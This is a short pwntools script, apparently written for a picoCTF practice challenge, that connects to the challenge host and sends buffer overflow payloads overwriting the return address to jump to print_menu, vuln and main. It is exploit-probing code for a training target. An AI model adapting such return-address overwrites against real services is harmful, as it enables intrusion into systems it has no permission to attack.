#!/usr/bin/env python3
from pwn import *

context.log_level = 'info'

HOST = 'shape-facility.picoctf.net'
PORT = 49954

log.info("Test 1: Exit normal")
io = remote(HOST, PORT)
io.sendlineafter(b'Exit the app\n', b'3')
io.sendlineafter(b'appreciate it: \n', b'normal')
output = io.recvall(timeout=2)
log.info(f"Output: {output}")
io.close()

log.info("Test 2: Overflow con return a dirección en .text")
io = remote(HOST, PORT)
io.sendlineafter(b'Exit the app\n', b'1')
io.sendlineafter(b'name: \n', b'test')

# Return a print_menu
print_menu_addr = 0x4011f6
payload = b'A'*8 + b'B'*4 + b'C'*8 + p64(print_menu_addr)
io.sendlineafter(b'Exit the app\n', b'3')
io.sendlineafter(b'appreciate it: \n', payload)
output = io.recvall(timeout=2)
log.info(f"Output al ret a print_menu: {output}")
io.close()

log.info("Test 3: Return a vuln")
io = remote(HOST, PORT)
io.sendlineafter(b'Exit the app\n', b'1')
io.sendlineafter(b'name: \n', b'test2')

vuln_addr = 0x401229
payload = b'D'*8 + b'E'*4 + b'F'*8 + p64(vuln_addr)
io.sendlineafter(b'Exit the app\n', b'3')
io.sendlineafter(b'appreciate it: \n', payload)
output = io.recvall(timeout=2)
log.info(f"Output al ret a vuln: {output}")
io.close()

log.info("Test 4: Return a main")
io = remote(HOST, PORT)
io.sendlineafter(b'Exit the app\n', b'1')
io.sendlineafter(b'name: \n', b'test3')

main_addr = 0x40140f
payload = b'G'*8 + b'H'*4 + b'I'*8 + p64(main_addr)
io.sendlineafter(b'Exit the app\n', b'3')
io.sendlineafter(b'appreciate it: \n', payload)
output = io.recvall(timeout=2)
log.info(f"Output al ret a main: {output}")
io.close()

log.info("Tests completados")
